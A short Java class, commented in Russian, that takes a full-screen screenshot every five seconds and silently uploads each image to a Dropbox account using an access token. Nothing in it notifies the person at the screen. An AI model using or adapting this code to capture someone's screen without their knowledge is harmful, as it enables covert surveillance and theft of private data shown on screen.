import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    //Токен для доступа к аккаунту dropbox
    private static final String ACCESS_TOKEN = "Поставьте сюда ваш токен";
    public void run() {
        //Создание клиента dropbox
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        //Фиксируем время создания скриншота
        SimpleDateFormat tms = new SimpleDateFormat("yyyy-MM-dd_HH:mm:ss");
        long startTime;
        for (int i = 0;; i++) {
            //Создание скриншота экрана и сохранение его в буфере обмена
            try {
                startTime = System.currentTimeMillis();
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                OutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenFullImage, "jpg", baos );
                byte[] buffer = ((ByteArrayOutputStream) baos).toByteArray();
            //Передача информации из буфера клиенту dropbox
                InputStream in = new ByteArrayInputStream(buffer);
                FileMetadata metadata = client.files().uploadBuilder("/example"+
                        tms.format(new Date())+ ".jpg").uploadAndFinish(in);
                System.out.println(tms.format(new Date()));
                sleep(5000 - (System.currentTimeMillis()-startTime)); //Может быть отрицательным
            }
            catch (Exception e) {
                e.getMessage();
                e.printStackTrace();
            }
        }
    }
}
